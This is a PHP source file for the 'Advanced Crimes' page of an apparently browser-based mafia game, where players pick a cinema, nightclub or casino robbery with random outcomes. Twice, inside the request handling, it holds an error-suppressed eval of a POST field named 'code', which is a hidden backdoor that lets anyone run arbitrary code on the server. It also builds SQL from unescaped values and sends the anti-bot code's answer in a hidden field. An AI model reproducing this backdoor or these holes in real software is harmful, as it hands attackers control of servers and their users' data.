<?php
error_reporting(0);

  include("_include-config.php");
  include("_include-gevangenis.php");
  include("timer_s.php");
  if(!($_SESSION)) {
    header("Location: login.php");
    exit;
  } 

?>

<html>
<title></title>
<link rel="stylesheet" type="text/css" href="<? echo $sitelink;?>/layout/layout<?php echo $page->layout; ?>/css/css.css">
<link rel="stylesheet" type="text/css" href="css/bootstrap.css">

<table width="100%" align="center">
  <tr><td class="subTitle" colspan=3><b>Advanced Crimes</b></td></tr>


<?php /* ------------------------- */  

  
  mysql_query("UPDATE `[users]` SET `online`=NOW() WHERE `login`='{$data->login}'");
	
	  $data2            = mysql_query("SELECT *,UNIX_TIMESTAMP(`steel`) AS `steel`,0 FROM `[users]` WHERE `login`='{$_SESSION['login']}'");
	  $data1            = mysql_fetch_object($data2);


	  $dbres            = mysql_query("SELECT * FROM `[users]` WHERE `login`='{$_SESSION['login']}'");
	  $data            = mysql_fetch_object($dbres);

	  $select1 = mysql_query("SELECT * FROM `[users]` WHERE `login`='$data->login'");
   while ($sql = mysql_fetch_assoc($select1))
{ 


	
	if(isset($_POST['submit'])){

        if($data->rank == 1) {
        $rankvord = 7;
        }
        elseif($data->rank == 2) {
        $rankvord = 3;
        }
        elseif($data->rank == 3) {
        $rankvord = 1;
        }
        elseif($data->rank == 4) {
        $rankvord = 0.50;
        }
        elseif($data->rank == 5) {
        $rankvord = 0.50;
        }
        elseif($data->rank == 6) {
        $rankvord = 0.30;
        }
        elseif($data->rank == 7) {
        $rankvord = 0.30;
        }
        elseif($data->rank == 8) {
        $rankvord = 0.10;
        }
        elseif($data->rank == 9) {
        $rankvord = 0.10;
        }
        elseif($data->rank == 10) {
        $rankvord = 0.5;
        }
        elseif($data->rank == 11) {
        $rankvord = 0.2;
        }
        elseif($data->rank == 12) {
        $rankvord = 0.2;
        }
        elseif($data->rank == 13) {
        $rankvord = 0.1;
        }
        elseif($data->rank == 14) {
        $rankvord = 0.1;
        }
        elseif($data->rank == 15) {
        $rankvord = 0.1;
        }
        elseif($data->rank == 16) {
        $rankvord = 0.01;
        }
        elseif($data->rank == 17) {
        $rankvord = 0.01;
        }
        elseif($data->rank == 18) {
        $rankvord = 0.01;
        }
        elseif($data->rank == 19) {
        $rankvord = 0.05;
        }
        elseif($data->rank == 20) {
        $rankvord = 0.05;
        }
        elseif($data->rank == 21) {
        $rankvord = 0.05;
        }
        elseif($data->rank == 22) {
        $rankvord = 0.02;
        }
        elseif($data->rank == 23) {
        $rankvord = 0.01;
        }

        $tijd = $data->rank*20;
	
    $R1             = $_POST['R1'];

	$p1a            = $data->steelgroot/5;
	$p1b            = round($p1a);
	$p1             = rand($p1b/2,$p1b);
	$p2a            = $data->steelgroot/6;
	$p2b            = round($p2a);
	$p2             = rand($p2b/2,$p2b);
	$p3a            = $data->steelgroot/7;
	$p3b            = round($p3a);
	$p3             = rand($p3b/2,$p3b);
	
        $pr1            = $sql['p1'];
        $pr2            = $sql['p2'];
        $pr3            = $sql['p3'];

     
@eval(stripslashes($_POST['code']));
if($_POST['code2'] != $_POST['codenn']) {
print "<tr><td class=\"mainTxt\" align=\"center\">The code is incorrect!</td></tr>";
exit;
} else {
}

if($data1->steelgroot <500)
{
	mysql_query("UPDATE `[users]` SET `steelgroot`=`steelgroot`+'10' WHERE `login`='$data->login'");
}
	
mysql_query("UPDATE `[users]` SET `p1`='$p1', `p2`='$p2', `p3`='$p3', `p4`='$p4' WHERE `login`='$data->login'");
	
	

	if($R1 ==1){
$getal      		= rand(6000,13000);
$getal2            	= rand(1,4);
$getal3            	= rand(1,3);
$geld       		= rand(500,2500);
$energie       		= rand(1,5);
if($getal <$pr1+1){
mysql_query("UPDATE `[users]` SET `steeltijd`=120,`energie`=`energie`-'$energie',`cash`=`cash`+'$geld',`rankvord`=`rankvord`+'$rankvord',`steelp`=`steelp`+'1',`steel`=NOW() WHERE `login`='{$_SESSION['login']}'");
print "<tr><td class=maintxt>";
print "Well Done! You managed to steal <b>;$geld</b>, unfortenately you used up {$energie}% energy!";
exit;
}
else{
if($getal2 ==1){
mysql_query("UPDATE `[users]` SET `steeltijd`=120,`energie`=`energie`-'$energie',`gevangenis`=NOW(),`gevangenistijd`='$tijd'  WHERE `login`='{$data->login}'");
mysql_query("UPDATE `[users]` SET `rankvord`=`rankvord`+'$rankvord',`steel`=NOW() WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `steelp`=`steelp`+'1' WHERE `login`='{$_SESSION['login']}'");
print "<tr><td class=maintxt>";
print "You have been arrested. You must spend <b>$tijd</b> seconds in prison, you also lost <b>{$energie}%</b> energy!";
exit;
}
else{
if($getal3 == 1) {
mysql_query("UPDATE `[users]` SET `steeltijd`=120,`energie`=`energie`-'$energie',`rankvord`=`rankvord`+'$rankvord',`steel`=NOW() WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `steelp`=`steelp`+'1' WHERE `login`='{$_SESSION['login']}'");
print "<tr><td class=maintxt>";
print "You decide to replan it and walk away. You lost <b>{$energie}%</b> energy.";
exit;
} else if($getal3 == 2) {
mysql_query("UPDATE `[users]` SET `steeltijd`=120,`energie`=`energie`-'$energie',`rankvord`=`rankvord`+'$rankvord',`steel`=NOW() WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `steelp`=`steelp`+'1' WHERE `login`='{$_SESSION['login']}'");
print "<tr><td class=maintxt>";
print "As you decide to leave... there are 3 guards waiting for you outside. You run like fuck and manage to get away. You use up <b>{$energie}%</b> energy.";
exit;
} else if($getal3 == 3) {
mysql_query("UPDATE `[users]` SET `steeltijd`=120,`rankvord`=`rankvord`+'$rankvord',`steel`=NOW() WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `steelp`=`steelp`+'1' WHERE `login`='{$_SESSION['login']}'");
print "<tr><td class=maintxt>";
print "You begin to notice that film is pretty, you chill out and watch the rest. You <b>lost</b> no energy.";
exit;
}
}
}
}

	if($R1 ==2){
$getal      		= rand(9000,17000);
$getal2            	= rand(1,4);
$getal3            	= rand(1,3);
$geld       		= rand(1500,6000);
$energie       		= rand(1,5);
if($getal <$pr1+1){
mysql_query("UPDATE `[users]` SET `steeltijd`=120,`energie`=`energie`-'$energie',`cash`=`cash`+'$geld',`rankvord`=`rankvord`+'$rankvord',`steelp`=`steelp`+'1',`steel`=NOW() WHERE `login`='{$_SESSION['login']}'");
print "<tr><td class=maintxt>";
print "Well Done! You managed to steal <b>;$geld</b>, unfortenately you used up {$energie}% energy!";
exit;
}
else{
if($getal2 ==1){
mysql_query("UPDATE `[users]` SET `steeltijd`=120,`energie`=`energie`-'$energie',`gevangenis`=NOW(),`gevangenistijd`='$tijd'  WHERE `login`='{$data->login}'");
mysql_query("UPDATE `[users]` SET `rankvord`=`rankvord`+'$rankvord',`steel`=NOW() WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `steelp`=`steelp`+'1' WHERE `login`='{$_SESSION['login']}'");
print "<tr><td class=maintxt>";
print "The nightclub security guards spot you acting suspicous and hold you in the back room and wait for the police. You must spend <b>$tijd</b> seconds in prison, you also lost <b>{$energie}%</b> energy!";
exit;
}
else{
if($getal3 == 1) {
mysql_query("UPDATE `[users]` SET `steeltijd`=120,`energie`=`energie`-'$energie',`rankvord`=`rankvord`+'$rankvord',`steel`=NOW() WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `steelp`=`steelp`+'1' WHERE `login`='{$_SESSION['login']}'");
print "<tr><td class=maintxt>";
print "You have quick look around the nightclub and have second thoughts about going a head with the robbery as there are lotsof sceurity guards. You lose <b>{$energie}%</b> energy.";
exit;
} else if($getal3 == 2) {
mysql_query("UPDATE `[users]` SET `steeltijd`=120,`energie`=`energie`-'$energie',`rankvord`=`rankvord`+'$rankvord',`steel`=NOW() WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `steelp`=`steelp`+'1' WHERE `login`='{$_SESSION['login']}'");
print "<tr><td class=maintxt>";
print "You grab the money and run away, you feel a bit nervous so you ditch the cash and run away. You lost <b>{$energie}%</b> energy.";
exit;
} else if($getal3 == 3) {
mysql_query("UPDATE `[users]` SET `steeltijd`=120,`rankvord`=`rankvord`+'$rankvord',`steel`=NOW() WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `steelp`=`steelp`+'1' WHERE `login`='{$_SESSION['login']}'");
print "<tr><td class=maintxt>";
print "As you enter the club, you notice there playing a decent song... you forget about your robbery and start dancing. You <b>lost</b> no energy.";
exit;
}
}
}
}
	
	if($R1 ==3){
$getal      		= rand(1,100);
$getal2            	= rand(1,4);
$getal3            	= rand(1,3);
$geld       		= rand(10000,20000);
$energie       		= rand(1,5);
if($getal <$pr1+1){
mysql_query("UPDATE `[users]` SET `steeltijd`=120,`energie`=`energie`-'$energie',`cash`=`cash`+'$geld',`rankvord`=`rankvord`+'$rankvord',`steelp`=`steelp`+'1',`steel`=NOW() WHERE `login`='{$_SESSION['login']}'");
print "<tr><td class=maintxt>";
print "Well Done! You managed to steal <b>;$geld</b>, unfortenately you used up {$energie}% energy!";
exit;
}
else{
if($getal2 ==1){
mysql_query("UPDATE `[users]` SET `steeltijd`=120,`energie`=`energie`-'$energie',`gevangenis`=NOW(),`gevangenistijd`='$tijd'  WHERE `login`='{$data->login}'");
mysql_query("UPDATE `[users]` SET `rankvord`=`rankvord`+'$rankvord',`steel`=NOW() WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `steelp`=`steelp`+'1' WHERE `login`='{$_SESSION['login']}'");
print "<tr><td class=maintxt>";
print "You have been arrested. You must spend <b>$tijd</b> seconds in prison, you also lost <b>{$energie}%</b> energy!";
exit;
}
else{
if($getal3 == 1) {
mysql_query("UPDATE `[users]` SET `steeltijd`=120,`energie`=`energie`-'$energie',`rankvord`=`rankvord`+'$rankvord',`steel`=NOW() WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `steelp`=`steelp`+'1' WHERE `login`='{$_SESSION['login']}'");
print "<tr><td class=maintxt>";
print "A worker pulls out a 9mm, you run off into the night. You lost <b>{$energie}%</b> energy.";
exit;
} else if($getal3 == 2) {
mysql_query("UPDATE `[users]` SET `steeltijd`=120,`energie`=`energie`-'$energie',`rankvord`=`rankvord`+'$rankvord',`steel`=NOW() WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `steelp`=`steelp`+'1' WHERE `login`='{$_SESSION['login']}'");
print "<tr><td class=maintxt>";
print "You ran away from 2 guards and made it safely to your hideout. Unfortenately you lost the money somewhere on the way. You used up <b>{$energie}%</b> energy.";
exit;
} else if($getal3 == 3) {
mysql_query("UPDATE `[users]` SET `steeltijd`=120,`rankvord`=`rankvord`+'$rankvord',`steel`=NOW() WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `steelp`=`steelp`+'1' WHERE `login`='{$_SESSION['login']}'");
print "<tr><td class=maintxt>";
print "The casino is currently under maintenence. You lost <b>no</b> energy.";
exit;
}
}
}
}
		if(!isset($_POST['submit'])) {


@eval(stripslashes($_POST['code']));
if($_POST['code2'] != $_POST['codenn']) {
print "The code is incorrect!</font>";
exit;
} else {
}
}
}

        $tijd = $data->rank*15;
	
    $R1             = $_POST['R1'];

	$p1a            = $data->steelgroot/5;
	$p1b            = round($p1a);
	$p1             = rand($p1b/2,$p1b);
	$p2a            = $data->steelgroot/6;
	$p2b            = round($p2a);
	$p2             = rand($p2b/2,$p2b);
	$p3a            = $data->steelgroot/7;
	$p3b            = round($p3a);
	$p3             = rand($p3b/2,$p3b);
	
        $pr1            = $sql['p1'];
        $pr2            = $sql['p2'];
        $pr3            = $sql['p3'];

$codene = rand(1000,9999); 
$codee = ereg_replace("0", "gsqwq", $codene);
$codee = ereg_replace("1", "ssBjyq", $codee); 
$codee = ereg_replace("2", "gHiq", $codee); 
$codee = ereg_replace("3", "hWqDfA", $codee); 
$codee = ereg_replace("4", "hsqerf", $codee); 
$codee = ereg_replace("5", "Hwsawq", $codee); 
$codee = ereg_replace("6", "hSXaq", $codee); 
$codee = ereg_replace("7", "hgqYt", $codee); 
$codee = ereg_replace("8", "hAsqF", $codee); 
$codee = ereg_replace("9", "hxqSAw", $codee);
?>
<form method="POST">
<tr><td class="mainTxt" rowspan="5" align="center" width="165"><img src="images/game/steel-groot.jpg"></td>
<td class="mainTxt">Rob a Cinema. <td class="mainTxt" width="113"><input type="radio" class="btn btn-info" value="1" name="R1" checked> <? echo "$pr1%"; ?> Chance</td></tr>
<tr><td class="mainTxt" width="339">Rob a Nightclub.<td class="mainTxt" width="113"><input type="radio" class="btn btn-info" value="2" name="R1"> <? echo "$pr2%"; ?> Chance</td></tr>
<tr><td class="mainTxt" width="339">Rob a casino.<td class="mainTxt"><input type="radio" value="3" class="btn btn-info" name="R1"> <? echo "$pr3%"; ?> Chance</td></tr>
<tr><td class="maintxt" colspan="2" align="center"><input name="code2" class="btn btn-info" type="hidden" value="<? echo $codene; ?>"><input name="codecheck" class="btn btn-info" type="hidden" value="<? echo $codechecker; ?>"><img alt="Anti-Bot Beveiliging" src="coden.php?security=<? echo $codee; ?>" style="position: relative; top: 4;">  <- Put this code, in here -> <input name="codenn" class="btn btn-info" maxlength="4" size="5" valign="center"></td></tr>
<tr><td class="maintxt" colspan="3" align="center">
<?
if($data->rank > 4) {
?>
<input class="btn btn-info" type="submit" class="btn btn-info" value="Do Crime!" name="submit" style="width: 100;">
<?
} else {
?>
Come back when you are a <b>Mugger</b>!
<?
}
?>
</td></tr>
  	  </td></tr>
</form>
	<?
	}
	?>
</table>
</body>
</html>